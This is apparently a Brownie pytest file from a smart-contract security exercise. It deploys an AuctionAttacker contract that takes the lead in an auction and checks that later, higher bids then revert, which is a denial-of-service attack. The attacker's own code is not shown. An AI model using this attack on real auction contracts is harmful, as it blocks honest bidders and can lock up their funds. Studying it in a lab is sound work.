from scripts.DOS_2_helper import *
from brownie import AuctionAttacker
import brownie
import pytest

@pytest.fixture
def test_dos():

    attackerInitialBalance = attacker.balance()
    #flash_attack = TokenDOS.deploy(auction.address,{'from': attacker})
    auction.bid({'from': user1,'value': USER1_FIRST_BID})
    auction.bid({'from': user2,'value': USER2_FIRST_BID})
    assert(auction.highestBid() == USER2_FIRST_BID)
    assert(auction.currentLeader() == user2.address)


def test_dos_exploit(test_dos):

    auction_attacker = AuctionAttacker.deploy(auction.address, {'from': attacker,'value': '7 ether'})
    auction_attacker.attack()
    assert(auction.currentLeader() == auction_attacker.address)
    highestBid = auction.highestBid()
    with brownie.reverts():
        auction.bid({'from': user1,'value': highestBid * 5}).wait(1)

    assert(auction.currentLeader() != user1.address)
    assert(auction.currentLeader() != user2.address)